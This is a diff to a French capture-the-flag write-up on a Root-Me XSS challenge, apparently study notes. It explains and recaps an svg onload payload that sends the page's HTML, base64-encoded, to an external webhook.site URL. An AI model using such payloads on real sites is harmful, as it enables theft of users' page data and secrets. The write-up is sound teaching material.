@@ -69,10 +69,10 @@ http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.hr
 ```
 Bon au niveau du svg nous gardons la même logique. Maintenant laisser moi vous expliquez la suite du payload. 
 
-	```html
-	document.location.href= 
-	```
-	
+```html
+document.location.href= 
+```
+
 Va nous permettre dans notre cas de dire "lorsque tu as analyser et afficher avec succès l'image tu vas quitter la page et aller naviger vers le nouveau URL : ".
 Dans notre cas document.location.href va pointer sur l'url de webhook url qui va nous permettre de récupérer les données de la query que nous allons initialisé.
 
@@ -92,7 +92,7 @@ Bon donc après le .concat permet juste de collé à ?c= ce qui va donner :
 
 Bon maintenant pourquoi le encodeURIComponent ? 
 
-En réalité, lorsque vous êtes habituer vous verrez que l'option d'encodage en base 64 btoa(encodage) et atob (pour décoder) si vous récupérer directement les caractère + seront remplacer par " " ce qui donne donc un code en base64 qui n'est pas facile à décoder. Il faudrait parse (lire la donnée) et séparer avec un .replace ou autre pour remplacer les caractère. Or ici encodeURIComponent va permettre de mettre tous les signes comme +, " " "/" etc... en code URL Encode. Ce qui donne par exemple pour le + => %2B etc... et donc par la suite btoa va pouvoir bien encoder les données en base64.
+En réalité, lorsque vous êtes habituer vous verrez que l'option d'encodage en base 64 btoa(encodage) et atob (pour décoder) si vous récupérer directement les caractère + seront remplacer par " " ce qui donne donc un code en base64 qui n'est pas facile à décoder. Il faudrait parse (lire la donnée) et séparer avec un .replace ou autre pour remplacer les caractère. Or ici encodeURIComponent va permettre de mettre tous les signes comme +, " ", "/" etc... en code URL Encode. Ce qui donne par exemple pour le + => %2B etc... et donc par la suite btoa va pouvoir bien encoder les données en base64.
 
 Bon maintenant nous savons que l'ont veut récupérer les données qui se situe actuellement sur la page web car c'est ce qui nous ai dis avec : 
 
@@ -100,11 +100,23 @@ Bon maintenant nous savons que l'ont veut récupérer les données qui se situe 
 
 {FLAG_REDACTED} qui est actuellement dans la page.
 
+c'est pour cela qu'on met : 
+```html
+document.body.innerHTML
+```
 
-![](../img/Pasted%20image%2020260815000649.png)
+Qui récupéreras les données dans le body de la page (le code HTML) et grâce au btoa cela va encoder la page en base64. 
 
+Bon récapitulatif du payload : 
 
+```html
+http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
+```
+	
 
+![](../../Pasted%20image%2020260815010857.png)
+
+Bon je vais pas vous mentir actuellement vous pourrez attendre longtemps rien n'arriveras p
 
 Nouveau Payload
 
